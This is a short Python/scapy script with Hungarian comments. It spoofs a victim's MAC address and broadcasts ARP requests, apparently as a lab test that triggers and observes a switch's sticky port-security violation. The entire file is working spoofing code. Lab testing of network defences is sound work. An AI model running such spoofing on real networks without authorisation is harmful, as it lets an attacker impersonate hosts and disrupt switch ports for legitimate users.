#!/usr/bin/env python3
"""A legit áldozat MAC-címét veszi fel a támadó — a port security
sticky-listája miatt violation lép fel.

Futtatás: sudo python3 mac_spoof.py eth0 00:50:56:AA:BB:01
"""
import sys, time
from scapy.all import Ether, ARP, sendp, conf

def main():
    iface, victim_mac = sys.argv[1], sys.argv[2]
    conf.iface = iface
    frame = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / \
            ARP(op=1, hwsrc=victim_mac, psrc="10.10.10.77", pdst="10.10.10.1")
    print(f"[*] ARP Request a spoofolt MAC-címmel ({victim_mac})...")
    for _ in range(20):
        sendp(frame, verbose=0)
        time.sleep(0.5)
    print("[!] Kész. Ellenőrizd: 'show port-security' + syslog.")

if __name__ == "__main__":
    main()
